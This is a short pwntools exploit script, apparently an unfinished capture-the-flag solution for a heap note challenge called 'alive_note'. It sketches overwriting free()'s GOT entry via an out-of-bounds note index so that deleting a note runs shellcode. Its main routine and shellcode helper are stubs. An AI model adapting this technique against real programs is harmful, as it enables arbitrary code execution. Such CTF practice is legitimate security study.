#!/usr/bin/env python3
from pwn import *

DWORD = 4

elf = ELF("./given/alive_note")
if args.REMOTE:
    p = process([elf.path])
else:
    p = process([elf.path])
    if args.D:
        context.terminal = ["tmux", "splitw", "-h"]
        gdb.attach(p, "\n".join([
                "b *0x80488ea", # call free()
            ]))

def add_note(idx, content):
    """
    The heap region will be executable in REMOTE settings
    The content will be the shellcode
    See check() function in the binary to craft shellcode
    """
    assert(len(content) <= 8)
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Index :", str(idx).encode())
    content = content.ljust(8, b"\x00")
    p.sendafter(b"Name :", content)

def del_note(idx):
    p.sendlineafter(b"Your choice :", b"3")
    p.sendlineafter(b"Index :", str(idx).encode())

def shellcode_ret():
    """
    Eax = heap_address
    """
    return 0

def short_shellcode_exec(shellcode):
    data_note = 0x804a080
    got_free_idx = (elf.got["free"] - data_note) // DWORD
    add_note(got_free_idx, shellcode)
    del_note(got_free_idx)


def exploit():
    #short_shellcode_exec(b"aaa")
    add_note(0, b"a")
    add_note(1, b"b")
    del_note(2)
    p.interactive()


if __name__ == "__main__":
    exploit()
